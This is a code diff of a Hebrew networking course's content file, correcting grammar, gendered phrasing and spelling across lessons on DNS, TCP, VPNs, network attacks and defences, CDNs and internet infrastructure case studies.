@@ -55,7 +55,7 @@ export const tracks = [
         type: "demo",
         title: "המדריך מדגים: מה השרת שולח ללקוח",
         content: `
-          <p>כשבחורה בוחרת "View page source" (הצג מקור) באתר, היא רואה את הקוד שהשרת שלח. הנה דוגמה לפנים הדף – זה מה שהשרת מחזיר:</p>
+          <p>כשבוחרים "View page source" (הצג מקור) באתר, רואים את הקוד שהשרת שלח. הנה דוגמה למה שנמצא בפנים הדף – זה מה שהשרת מחזיר:</p>
           <div class="code-preview">
             <pre><code>&lt;!DOCTYPE html&gt;
 &lt;html lang="he"&gt;
@@ -70,7 +70,7 @@ export const tracks = [
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
           </div>
-          <p class="demo-note">📋 זה מה שמופיע בחלון "מקור הדף" – טקסט שמתאר איפה כל אלמנט מונח, אילו תמונות יש, ומה הכותרת. הדפדפן קורא את הקוד הזה ובונה ממנו את העמוד שאת רואה.</p>
+          <p class="demo-note">📋 זה מה שמופיע בחלון "מקור הדף" – טקסט שמתאר איפה כל אלמנט מונח, אילו תמונות יש, ומה הכותרת. הדפדפן קורא את הקוד הזה ובונה ממנו את העמוד שרואים.</p>
         `
       },
       {
@@ -107,7 +107,7 @@ export const tracks = [
         type: "demo",
         title: "המדריך מדגים: פלט של פקודת ping",
         content: `
-          <p>כשרצים <code>ping www.facebook.com</code>, זה הפלט שמופיע – הנה מה שאת רואה:</p>
+          <p>כשרצים <code>ping www.facebook.com</code>, זה הפלט שמופיע – הנה מה שמופיע:</p>
           <div class="code-preview">
             <pre><code>C:\&gt; ping www.facebook.com
 
@@ -144,13 +144,13 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
         type: "simulation",
         title: "הדמיית DNS – תרגום דומיין ל־IP",
         simId: "dnsLookup",
-        content: `<p>הדמי את תהליך ה־DNS: הכניסי דומיין (למשל google.com) ולחצי "חפשי IP" – המדריך מדגים את הזרימה.</p>`
+        content: `<p>הדמי את תהליך ה־DNS: הכניסו דומיין (למשל google.com) ולחצו "חפש IP" – המדריך מדגים את הזרימה.</p>`
       },
       {
         type: "simulation",
         title: "הדמיית מסלול חבילה ברשת",
         simId: "packetFlow",
-        content: `<p>לחצי "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך Switch ונתבים עד לשרת – כל צעד בנפרד.</p>`
+        content: `<p>לחצו "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך Switch ונתבים עד לשרת – כל צעד בנפרד.</p>`
       },
       {
         type: "explanation",
@@ -196,7 +196,7 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
             <h3>נקודות מפתח:</h3>
             <ul>
               <li>מודל לקוח-שרת: הדפדפן שולח בקשה, השרת מחזיר תגובה</li>
-              <li>כתובות IP מזהה מחשבים (4 בתים, 0-255)</li>
+              <li>כתובות IP מזהות מחשבים (4 בתים, 0-255)</li>
               <li>ping – בדיקת חיבור, מציאת IP. traceroute – מסלול החבילות</li>
               <li>DNS מתרגם שם דומיין (www.facebook.com) ל־IP. nslookup – שאילתת DNS</li>
               <li>GeoIP – מיפוי IP למיקום גיאוגרפי (לא מדויק)</li>
@@ -436,7 +436,7 @@ server_socket.close()</code></pre>
         type: "simulation",
         title: "הדמיית Encapsulation / Decapsulation",
         simId: "encapsulation",
-        content: `<p>לחצי על "Encapsulation" כדי לראות איך כל שכבה מוסיפה Header בשליחה. לחצי "Decapsulation" לראות איך מקלפים בקבלה.</p>`
+        content: `<p>לחצו על "Encapsulation" כדי לראות איך כל שכבה מוסיפה Header בשליחה. לחצו "Decapsulation" לראות איך מקלפים בקבלה.</p>`
       },
       {
         type: "explanation",
@@ -914,7 +914,7 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
             <p class="diagram-caption">IP = בניין, פורט = דירה. כל שירות מאזין על פורט אחר</p>
           </div>
           <p>לדוגמה: פורט 80 (ב־TCP) = שירות HTTP. אם נשלח הודעה לפורט 80, השרת מבין שמדובר בבקשת דף אינטרנט.</p>
-          <p><strong>פורט פתוח</strong> = פורט שתוכנה מאזינה עליו וממוכנה לקבל חיבורים.</p>
+          <p><strong>פורט פתוח</strong> = פורט שתוכנה מאזינה עליו ומוכנה לקבל חיבורים.</p>
         `
       },
       {
@@ -951,7 +951,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "simulation",
         title: "הדמיית TCP Handshake",
         simId: "tcpHandshake",
-        content: `<p>לחצי "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – SYN, SYN-ACK, ACK.</p>`
+        content: `<p>לחצו "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – SYN, SYN-ACK, ACK.</p>`
       },
       {
         type: "explanation",
@@ -993,7 +993,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           },
           {
             q: "מתי נבחר TCP ומתי UDP?",
-            a: "TCP כש צריך שכל המידע יגיע בדיוק – דפים, קבצים, אימייל. UDP כשזמנים אמיתיים חשובים יותר מהשלמות – שיחת וידאו שעדיף פריים חסר מאשר עיכוב."
+            a: "TCP כשצריך שכל המידע יגיע בדיוק – דפים, קבצים, אימייל. UDP כשזמנים אמיתיים חשובים יותר מהשלמות – שיחת וידאו שעדיף פריים חסר מאשר עיכוב."
           },
           {
             q: "מה תפקיד ה־Handshake ב־TCP?",
@@ -1393,7 +1393,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "טכנולוגיות השכבה הפיזית",
         content: `
-          <p><strong>כבל נחושת (Ethernet)</strong> – אותות חשמליים. <strong>סיב אופטי</strong> – פולסים של אור. <strong>ADSL</strong> – תקשורת through קו טלפון. <strong>WiFi</strong> – גלי רדיו. <strong>לווין</strong> – אותות אלקטרומגנטיים. <strong>סלולר (4G/5G)</strong> – רשתות אלחוטיות. כל טכנולוגיה מגדירה תדר, עוצמה, וצורת קידוד (איך 0 ו־1 מיוצגים).</p>
+          <p><strong>כבל נחושת (Ethernet)</strong> – אותות חשמליים. <strong>סיב אופטי</strong> – פולסים של אור. <strong>ADSL</strong> – תקשורת דרך קו טלפון. <strong>WiFi</strong> – גלי רדיו. <strong>לווין</strong> – אותות אלקטרומגנטיים. <strong>סלולר (4G/5G)</strong> – רשתות אלחוטיות. כל טכנולוגיה מגדירה תדר, עוצמה, וצורת קידוד (איך 0 ו־1 מיוצגים).</p>
         `
       },
       {
@@ -1428,7 +1428,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>WiFi מבוסס על תקן <strong>IEEE 802.11</strong>. שני תדרים עיקריים:</p>
           <table class="content-table">
             <tr><th>תדר</th><th>טווח</th><th>מהירות</th><th>חסרון</th></tr>
-            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומוס – מיקרוגל, Bluetooth</td></tr>
+            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומס – מיקרוגל, Bluetooth</td></tr>
             <tr><td>5 GHz</td><td>קצר יותר</td><td>גבוהה יותר</td><td>חוצה קירות פחות טוב</td></tr>
             <tr><td>6 GHz (WiFi 6E)</td><td>קצר</td><td>גבוהה מאוד</td><td>חדש, פחות מכשירים</td></tr>
           </table>
@@ -2030,7 +2030,7 @@ Addresses: 142.250.185.46</code></pre>
         title: "שאלות הבנה - פרק 14",
         questions: [
           {
-            q: "איזו פקודה משתמשת לבדוק אם שרת מרוחק מגיב?",
+            q: "באיזו פקודה משתמשים כדי לבדוק אם שרת מרוחק מגיב?",
             a: "ping – שולח ICMP Echo Request. אם התשובה מגיעה, השרת חי ומחובר. אם לא – יכול להיות חסימה, כיבוי, או בעיית רשת."
           }
         ]
@@ -2161,7 +2161,7 @@ response = requests.get('https://self-signed.badssl.com', verify=False)</code></
           {
             title: "HTTPS מגן על התעבורה – לא על האתר",
             icon: "🔒",
-            content: `<p>HTTPS מצפין את התקשורת בין הדפדפן לשרת. אבל אם האתר עצמו רע – HTTPS לא עוזר. אתר פישינג יכול להיות HTTPS תקין עם 🔒. <strong>החשיבה:</strong> 🔒 אומר "הקשר מוצפן" – לא "האתר אמין". תמיד בדקי את הדומיין, לא רק את המנעול.</p>`
+            content: `<p>HTTPS מצפין את התקשורת בין הדפדפן לשרת. אבל אם האתר עצמו רע – HTTPS לא עוזר. אתר פישינג יכול להיות HTTPS תקין עם 🔒. <strong>החשיבה:</strong> 🔒 אומר "הקשר מוצפן" – לא "האתר אמין". תמיד לבדוק את הדומיין, לא רק את המנעול.</p>`
           },
           {
             title: "MITM Attack – איך TLS מונע?",
@@ -2685,7 +2685,7 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
         type: "explanation",
         title: "Dual-Stack ומנגנוני מעבר",
         content: `
-          <p>העולם לא עבר לIPv6 ביום אחד. קיימים מנגנוני מעבר:</p>
+          <p>העולם לא עבר ל-IPv6 ביום אחד. קיימים מנגנוני מעבר:</p>
           <p><strong>Dual-Stack</strong> (מועדף) – מחשב/נתב מריץ IPv4 ו-IPv6 במקביל. משתמש ב-IPv6 כשזמין, נופל ל-IPv4. כך עובדות רוב הרשתות היום.</p>
           <p><strong>Tunneling</strong> – IPv6 בתוך IPv4:</p>
           <ul>
@@ -2697,7 +2697,7 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
             <li>DNS64 יוצר AAAA record סינתטי מה-A record: <code>64:ff9b::93.184.216.34</code></li>
             <li>NAT64 gateway מתרגם חבילות IPv6 ↔ IPv4 בפועל</li>
           </ul>
-          <p>נפוץ ברשתות סלולריות: iPhone-ים בT-Mobile נחשפים לIPv6-only עם NAT64 לגישה לאתרים ישנים.</p>
+          <p>נפוץ ברשתות סלולריות: iPhone-ים ב-T-Mobile נחשפים ל-IPv6-only עם NAT64 לגישה לאתרים ישנים.</p>
         `
       },
       {
@@ -2899,7 +2899,7 @@ sudo dscacheutil -flushcache</code></pre>
             <tr><td>Firefox, Chrome</td><td>✅ מובנה</td><td>לא</td><td>ברירת מחדל</td></tr>
           </table>
           <p>Cloudflare (<code>1.1.1.1</code>), Google (<code>8.8.8.8</code>), Mozilla – כולם מספקים DoH.</p>
-          <p><strong>מחלוקת:</strong> DoH ריכז שאילתות DNS בידי כמה ספקים גדולים. ארגונים מודאגים שDoH יעקוף את ה-Firewall הארגוני ויחשוף נתוני גלישה.</p>
+          <p><strong>מחלוקת:</strong> DoH ריכז שאילתות DNS בידי כמה ספקים גדולים. ארגונים מודאגים ש-DoH יעקוף את ה-Firewall הארגוני ויחשוף נתוני גלישה.</p>
         `
       },
       {
@@ -2942,7 +2942,7 @@ sudo dscacheutil -flushcache</code></pre>
         questions: [
           {
             q: "מה ההבדל בין Recursive Resolver ל-Authoritative Nameserver?",
-            a: "Recursive Resolver = שרת שפועל בשם הלקוח, מסיר queries לכל השרתים בהיררכיה עד שמגיע לתשובה. לרוב מנוהל ע\"י ISP או ספק (1.1.1.1). Authoritative = המקור האמיתי לדומיין ספציפי – מחזיר תשובה סופית ללא delegation נוסף."
+            a: "Recursive Resolver = שרת שפועל בשם הלקוח, מריץ queries לכל השרתים בהיררכיה עד שמגיע לתשובה. לרוב מנוהל ע\"י ISP או ספק (1.1.1.1). Authoritative = המקור האמיתי לדומיין ספציפי – מחזיר תשובה סופית ללא delegation נוסף."
           },
           {
             q: "למה צריך CNAME ולא רק A record?",
@@ -2978,7 +2978,7 @@ sudo dscacheutil -flushcache</code></pre>
         title: "Sliding Window – Flow Control",
         content: `
           <p><strong>Flow Control</strong> מונע ממחשב מהיר להציף מחשב איטי. הפתרון: <strong>Receive Window (rwnd)</strong>.</p>
-          <p>בכל ACK, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום בbuffer – שלח עד כאן". השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
+          <p>בכל ACK, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום ב-buffer – שלח עד כאן". השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 340 100" class="content-diagram">
               <rect x="10" y="20" width="280" height="60" rx="4" fill="var(--bg-elevated)" stroke="var(--accent)"/>
@@ -3048,7 +3048,7 @@ sudo dscacheutil -flushcache</code></pre>
           <ul>
             <li>שולח מיד (לא מחכה ל-timeout)</li>
             <li>ssthresh = cwnd / 2; cwnd = ssthresh + 3 MSS</li>
-            <li><strong>Fast Recovery</strong>: לא חוזרים ל-Slow Start – נשארים בCongestion Avoidance</li>
+            <li><strong>Fast Recovery</strong>: לא חוזרים ל-Slow Start – נשארים ב-Congestion Avoidance</li>
           </ul>
           <p>המוטיבציה: Timeout = ייתכן רשת עמוסה מאוד. Dup-ACKs = כנראה חבילה בודדת אבדה, הרשת עדיין עובדת.</p>
         `
@@ -3097,7 +3097,7 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
           {
             title: "TCP על קישורי לווין – BDP בעיה",
             icon: "🛰️",
-            content: `<p>לווין גיאוסטציונרי = RTT ≈ 600ms. BDP = 100Mbps × 0.6s = 7.5MB. שפורטוקול TCP ישן עם window 65KB ינצל רק 65KB/600ms = 0.87Mbps מתוך 100Mbps! <strong>BBR ו-Window Scaling</strong> פותרים זאת. Starlink (LEO orbit, RTT 20ms) עוקפת את הבעיה עם מסלול נמוך יותר. גלגולים: חיישת TCP ≠ חיישת פיזיקה.</p>`
+            content: `<p>לווין גיאוסטציונרי = RTT ≈ 600ms. BDP = 100Mbps × 0.6s = 7.5MB. שפורטוקול TCP ישן עם window 65KB ינצל רק 65KB/600ms = 0.87Mbps מתוך 100Mbps! <strong>BBR ו-Window Scaling</strong> פותרים זאת. Starlink (LEO orbit, RTT 20ms) עוקפת את הבעיה עם מסלול נמוך יותר. המסקנה: חוקי TCP ≠ חוקי פיזיקה.</p>`
           },
           {
             title: "Nagle's Algorithm – מיקרו-אופטימיזציה",
@@ -3137,7 +3137,7 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
           },
           {
             q: "מה Fast Retransmit ולמה הוא עדיף על Timeout?",
-            a: "3 Duplicate ACKs = צד אחד קיבל חבילות אחרי החסרה, אז הוא שולח ACKs חוזרים לsq האחרון שקיבל. Fast Retransmit שולח מיד ולא מחכה ל-RTO (שיכול להיות שניות). Fast Recovery לא מחזיר ל-Slow Start – cwnd נשאר גבוה. הרשת עדיין עובדת, רק חבילה אחת אבדה."
+            a: "3 Duplicate ACKs = צד אחד קיבל חבילות אחרי החסרה, אז הוא שולח ACKs חוזרים ל-seq האחרון שקיבל. Fast Retransmit שולח מיד ולא מחכה ל-RTO (שיכול להיות שניות). Fast Recovery לא מחזיר ל-Slow Start – cwnd נשאר גבוה. הרשת עדיין עובדת, רק חבילה אחת אבדה."
           }
         ]
       }
@@ -3151,7 +3151,7 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
         type: "explanation",
         title: "מה זה VPN?",
         content: `
-          <p><strong>VPN</strong> (Virtual Private Network) – יוצר "מנהרה" מוצפנת בין שני נקודות דרך רשת ציבורית. כאילו החיבור הוא פרטי ישיר, גם אם עובר דרך האינטרנט.</p>
+          <p><strong>VPN</strong> (Virtual Private Network) – יוצר "מנהרה" מוצפנת בין שתי נקודות דרך רשת ציבורית. כאילו החיבור הוא פרטי ישיר, גם אם עובר דרך האינטרנט.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 340 100" class="content-diagram">
               <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -3192,7 +3192,7 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
           <p><strong>IKE</strong> (Internet Key Exchange) – שלב חילופי המפתחות, UDP פורט 500:</p>
           <ul>
             <li><strong>IKEv1</strong> – שני שלבים (Phase 1 + Phase 2). ישן</li>
-            <li><strong>IKEv2</strong> (מועדף) – יעיל יותר, NAT Traversal מובנה (UDP 4500), תמיכה ב-MOBIKE לrerouting</li>
+            <li><strong>IKEv2</strong> (מועדף) – יעיל יותר, NAT Traversal מובנה (UDP 4500), תמיכה ב-MOBIKE ל-rerouting</li>
           </ul>
           <p>הצפנה: AES-256-GCM. Authentication: HMAC-SHA256. Key Exchange: Diffie-Hellman (DH group 14 = 2048bit, או 19/20 = ECDH).</p>
         `
@@ -3247,7 +3247,7 @@ Endpoint = peer.example.com:51820</code></pre>
         content: `
           <p><strong>ARP Spoofing / ARP Poisoning</strong>: תוקף שולח ARP Reply מזויף: "אני ה-gateway – MAC שלי הוא XX:XX". כל התעבורה מופנית אליו (MITM). מניעה: Dynamic ARP Inspection ב-Switch, ARP Cache כתובות קריטיות סטטיות.</p>
           <p><strong>DNS Spoofing / Cache Poisoning</strong>: תוקף מזהם cache של DNS Resolver עם תשובה מזויפת. כל מי שמסתמך על ה-Resolver מנותב לשרת פישינג. מניעה: DNSSEC.</p>
-          <p><strong>DoS / DDoS</strong>: הצפת שרת/רשת בתעבורה לגרום לה"פילה". SYN Flood: שולח אינסוף SYN ללא ACK – שרת מחזיק state לכל אחד. מניעה: SYN Cookies, rate limiting, CDN+Anycast.</p>
+          <p><strong>DoS / DDoS</strong>: הצפת שרת/רשת בתעבורה עד לקריסה. SYN Flood: שולח אינסוף SYN ללא ACK – שרת מחזיק state לכל אחד. מניעה: SYN Cookies, rate limiting, CDN+Anycast.</p>
           <p><strong>Port Scanning</strong>: nmap שולח SYN לכל הפורטים ומזהה פורטים פתוחים. חלק מכל penetration test. הגנה: Firewall עם default-deny + ידוע מינימום פורטים פתוחים.</p>
           <p><strong>Man-in-the-Middle (MITM)</strong>: תוקף בין שני צדדים. HTTPS + Certificate Pinning מגן. HSTS (HTTP Strict Transport Security) מונע downgrade ל-HTTP.</p>
         `
@@ -3360,7 +3360,7 @@ Endpoint = peer.example.com:51820</code></pre>
             <tr><td>Round Robin</td><td>בתור מחזורי</td><td>בקשות שוות זמן עיבוד</td></tr>
             <tr><td>Least Connections</td><td>לשרת עם הכי פחות חיבורים פעילים</td><td>בקשות שונות זמן עיבוד</td></tr>
             <tr><td>IP Hash</td><td>hash(client_IP) → תמיד אותו שרת</td><td>Session affinity (עגינה)</td></tr>
-            <tr><td>Weighted</td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בסיסי חומרה שונה</td></tr>
+            <tr><td>Weighted</td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בעלי חומרה שונה</td></tr>
           </table>
           <p><strong>שכבות:</strong></p>
           <ul>
@@ -3374,7 +3374,7 @@ Endpoint = peer.example.com:51820</code></pre>
         type: "explanation",
         title: "HTTP/2 ו-HTTP/3 – הדורות הבאים",
         content: `
-          <p><strong>HTTP/1.1</strong> (1997): בקשה-תגובה. חיבור אחד = בקשה אחת. Head-of-Line Blocking (HOL): בקשה תקועה בלוקת הבאות.</p>
+          <p><strong>HTTP/1.1</strong> (1997): בקשה-תגובה. חיבור אחד = בקשה אחת. Head-of-Line Blocking (HOL): בקשה תקועה חוסמת את הבאות.</p>
           <p><strong>HTTP/2</strong> (2015) – שיפורים:</p>
           <ul>
             <li><strong>Multiplexing</strong> – כמה בקשות על חיבור TCP אחד בו-זמנית. פותר HOL blocking ב-Application layer</li>
@@ -3536,7 +3536,7 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
         title: "SQL Slammer – 376 בתים ששיתקו את האינטרנט",
         content: `
           <p><strong>25 בינואר 2003, 05:30 UTC.</strong> תוך 10 דקות, 75,000 שרתים נדבקו. תוך 30 דקות — אינטרנט של דרום קוריאה קרס לחלוטין.</p>
-          <p><strong>הנשק:</strong> червь (תולעת) בגודל 376 בתים בלבד. קטן מספיק להיכנס בחבילת UDP אחת. ניצלה חולשה ידועה ב-Microsoft SQL Server — שכבר קיים לה patch מזה 6 חודשים.</p>
+          <p><strong>הנשק:</strong> תולעת (worm) בגודל 376 בתים בלבד. קטן מספיק להיכנס בחבילת UDP אחת. ניצלה חולשה ידועה ב-Microsoft SQL Server — שכבר קיים לה patch מזה 6 חודשים.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 360 110" class="content-diagram">
               <circle cx="180" cy="55" r="8" fill="#dc2626"/>
@@ -3642,7 +3642,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
         type: "explanation",
         title: "Chaos Engineering – שוברים בכוונה",
         content: `
-          <p><strong>Netflix, 2011:</strong> "מה יקרה אם שרת ייפול אקראי בproduction?" במקום לחשוב — הם ניסו. נולד <strong>Chaos Monkey</strong>.</p>
+          <p><strong>Netflix, 2011:</strong> "מה יקרה אם שרת ייפול אקראי ב-production?" במקום לחשוב — הם ניסו. נולד <strong>Chaos Monkey</strong>.</p>
           <p>Chaos Engineering = <strong>הזרקת כשלים מבוקרת למערכת חיה</strong> כדי לגלות חולשות לפני שהמציאות מגלה אותן.</p>
           <ul>
             <li><strong>Chaos Monkey:</strong> מפיל instances אקראיים ב-AWS</li>
@@ -3667,8 +3667,8 @@ Why not? → code review checklist didn't include DB review.</code></pre>
               <text x="180" y="95" text-anchor="middle" font-size="8" fill="var(--text-muted)">Chaos → כשל → fallback עובד = מערכת resilient</text>
             </svg>
           </div>
-          <p><strong>עיקרון:</strong> resilience לא נבנית בתכנון — היא נבדקת בפועל. Netflix מריצה Chaos Monkey בproduction מדי יום. הם יותר מוכנים לכשלים אמיתיים כי הם רגילים אליהם.</p>
-          <p><strong>GameDay:</strong> פרקטיקה של Amazon — ביום קבוע בוחרים תרחיש ("Region נפל") ומתרגלים תגובה. כמו תרגיל אש, אבל לresilient systems.</p>
+          <p><strong>עיקרון:</strong> resilience לא נבנית בתכנון — היא נבדקת בפועל. Netflix מריצה Chaos Monkey ב-production מדי יום. הם יותר מוכנים לכשלים אמיתיים כי הם רגילים אליהם.</p>
+          <p><strong>GameDay:</strong> פרקטיקה של Amazon — ביום קבוע בוחרים תרחיש ("Region נפל") ומתרגלים תגובה. כמו תרגיל אש, אבל ל-resilient systems.</p>
         `
       },
       {
@@ -3699,7 +3699,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
               <li>SQL Slammer (2003): 376 בתים, 10 דקות, 75K שרתים נגועים. Patch היה קיים. לא עודכנו</li>
               <li>BGP Leaks: כל AS יכול להכריז על כל prefix. RPKI = פתרון קריפטוגרפי חלקי</li>
               <li>Postmortem: blameless, timeline, 5 Why's, action items. לא עונשים — לומדים</li>
-              <li>Chaos Engineering: מזריקים כשלים בכוונה לגלות חולשות. Netflix Chaos Monkey בproduction יומיומי</li>
+              <li>Chaos Engineering: מזריקים כשלים בכוונה לגלות חולשות. Netflix Chaos Monkey ב-production יומיומי</li>
               <li>לקח עמוק: single point of failure = בעיה. redundancy + runbooks + testing = survival</li>
             </ul>
           </div>
@@ -3734,7 +3734,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
         title: "Netflix Open Connect – CDN בתוך ה-ISP",
         content: `
           <p>Netflix אחראית על ~15% מתנועת האינטרנט בעולם בשעות הערב. איך הם עושים את זה בלי לשלם מיליארדים על bandwidth?</p>
-          <p><strong>Open Connect Appliance (OCA):</strong> Netflix בנתה שרתי קאש מיוחדים ו<strong>מציעה אותם בחינם לISPs</strong>. הISP מקבל hardware בחינם, Netflix חוסכת bandwidth. Win-win.</p>
+          <p><strong>Open Connect Appliance (OCA):</strong> Netflix בנתה שרתי קאש מיוחדים ו<strong>מציעה אותם בחינם ל-ISPs</strong>. הISP מקבל hardware בחינם, Netflix חוסכת bandwidth. Win-win.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 360 120" class="content-diagram">
               <rect x="10" y="40" width="80" height="40" rx="4" fill="#fee2e2" stroke="#f87171"/>
@@ -3756,7 +3756,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
               <text x="180" y="115" text-anchor="middle" font-size="8" fill="var(--text-muted)">הvideo מגיע מה-ISP עצמו, לא מAWS</text>
             </svg>
           </div>
-          <p><strong>מה ה-OCA שומר?</strong> Netflix יודעת מה פופולרי באזור כל ISP. בלילה, היא מעבירה pre-emptively לOCA את הסדרות הפופולריות. למחרת — הכל ב-cache מקומי.</p>
+          <p><strong>מה ה-OCA שומר?</strong> Netflix יודעת מה פופולרי באזור כל ISP. בלילה, היא מעבירה pre-emptively ל-OCA את הסדרות הפופולריות. למחרת — הכל ב-cache מקומי.</p>
           <p><strong>טכנולוגית:</strong> כל OCA = FreeBSD + nginx מותאם + כוננים NVMe. גודל: 100-250TB storage. מריצים ~300Gbps bandwidth לכל appliance.</p>
         `
       },
@@ -3767,9 +3767,9 @@ Why not? → code review checklist didn't include DB review.</code></pre>
           <p><strong>2014:</strong> WhatsApp נמכרת לפייסבוק ב-$19 מיליארד. 450 מיליון משתמשים פעילים. <strong>55 עובדים בסך הכל.</strong></p>
           <p>איך? ארכיטקטורה שמינימליזציה היא עיקרה:</p>
           <ul>
-            <li><strong>Erlang/OTP:</strong> שפת תכנות שנבנתה לtelecom, לניהול מיליוני חיבורים קונקורנטיים. כל חיבור = process קל משקל (לא thread OS)</li>
+            <li><strong>Erlang/OTP:</strong> שפת תכנות שנבנתה ל-telecom, לניהול מיליוני חיבורים קונקורנטיים. כל חיבור = process קל משקל (לא thread OS)</li>
             <li><strong>Single responsibility:</strong> WhatsApp לא עשתה stories, games, payments. <strong>רק הודעות</strong>. פחות פיצ'רים = פחות bugs = צוות קטן</li>
-            <li><strong>XMPP מותאם:</strong> פרוטוקול XML-based לhidden messaging שWhatsApp שינתה להיות binary — קטן פי 10</li>
+            <li><strong>XMPP מותאם:</strong> פרוטוקול XML-based ל-instant messaging ש-WhatsApp שינתה להיות binary — קטן פי 10</li>
           </ul>
           <div class="code-preview">
             <pre><code># ארכיטקטורת WhatsApp בצורה פשוטה:
@@ -3832,7 +3832,7 @@ vs. Python/Java thread: 8-512MB per thread
             <li>כבל מודרני: 400+ Tbps (!)</li>
             <li>עומד 25 שנה בלחץ אוקיאני, טמפרטורה קרה, מלח</li>
           </ul>
-          <p><strong>מי מחזיק את הכבלים?</strong> עד לפני 10 שנים — קונסורציומי של טלקומים. היום — גוגל, פייסבוק, Amazon בנו כבלים <strong>פרטיים</strong>:</p>
+          <p><strong>מי מחזיק את הכבלים?</strong> עד לפני 10 שנים — קונסורציומים של טלקומים. היום — גוגל, פייסבוק, Amazon בנו כבלים <strong>פרטיים</strong>:</p>
           <ul>
             <li><strong>Dunant</strong> (Google) — US-France, 250Tbps</li>
             <li><strong>2Africa</strong> (Meta) — מקיף את אפריקה, 180Tbps</li>
@@ -3884,7 +3884,7 @@ vs. Python/Java thread: 8-512MB per thread
           {
             title: "ספקיות הענן ממציאות את הרשת מחדש",
             icon: "☁️",
-            content: `<p>Google, AWS, Azure בנו רשתות שמגיעות לביצועים שטלקומים בנו דעצורים לעשות. BGP ב-2024 הוא עדיין פרוטוקול שנוצר ב-1989 "על מפיות בדינר". QUIC, HTTP/3, SD-WAN, eBPF — הטכנולוגיות שמחליפות את הרשת ישנה נוצרות בחברות הטכנולוגיה, לא בIETF בלבד.</p>`
+            content: `<p>Google, AWS, Azure בנו רשתות שמגיעות לביצועים שטלקומים לא הצליחו לעשות. BGP ב-2024 הוא עדיין פרוטוקול שנוצר ב-1989 "על מפיות בדינר". QUIC, HTTP/3, SD-WAN, eBPF — הטכנולוגיות שמחליפות את הרשת ישנה נוצרות בחברות הטכנולוגיה, לא בIETF בלבד.</p>`
           }
         ]
       },
@@ -3895,7 +3895,7 @@ vs. Python/Java thread: 8-512MB per thread
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>Netflix Open Connect: OCA ב-ISPs — פריה ה-cache מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
+              <li>Netflix Open Connect: OCA ב-ISPs — טעינת ה-cache מראש מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
               <li>WhatsApp: Erlang = מיליון חיבורים קונקורנטיים ב-2GB RAM. פחות פיצ'רים = scale גדול</li>
               <li>Google B4: SD-WAN פרטי, OpenFlow controller, 100% bandwidth utilization, hardware מותאם</li>
               <li>כבלי ים: 99% מהתנועה הבינלאומית. Google/Meta/Microsoft בנו כבלים פרטיים</li>
@@ -3911,11 +3911,11 @@ vs. Python/Java thread: 8-512MB per thread
         questions: [
           {
             q: "מה ה-Open Connect Appliance של Netflix ואיזה יתרון הוא נותן לISP?",
-            a: "OCA = שרת cache שNetflix מספקת לISPs בחינם. ה-ISP מקבל hardware ללא עלות, ותנועת הvideo לא יוצאת מהרשת שלו (חוסך bandwidth יקר). Netflix חוסכת עלויות transit עצומות. Win-win."
+            a: "OCA = שרת cache שNetflix מספקת ל-ISPs בחינם. ה-ISP מקבל hardware ללא עלות, ותנועת הvideo לא יוצאת מהרשת שלו (חוסך bandwidth יקר). Netflix חוסכת עלויות transit עצומות. Win-win."
           },
           {
             q: "למה WhatsApp בחרה ב-Erlang ולא ב-Python או Java?",
-            a: "Erlang/OTP נבנתה לtelecom — ניהול מיליוני חיבורים קונקורנטיים. כל חיבור הוא process קל (ולא thread OS כבד). ב-Erlang: מיליון חיבורים ≈ 2GB RAM. ב-Java threads: עשרות GB. הבחירה הארכיטקטונית אפשרה צוות קטן לנהל scale ענק."
+            a: "Erlang/OTP נבנתה ל-telecom — ניהול מיליוני חיבורים קונקורנטיים. כל חיבור הוא process קל (ולא thread OS כבד). ב-Erlang: מיליון חיבורים ≈ 2GB RAM. ב-Java threads: עשרות GB. הבחירה הארכיטקטונית אפשרה צוות קטן לנהל scale ענק."
           },
           {
             q: "מה Anycast ואיך Cloudflare משתמשת בו להגנה מDDoS?",
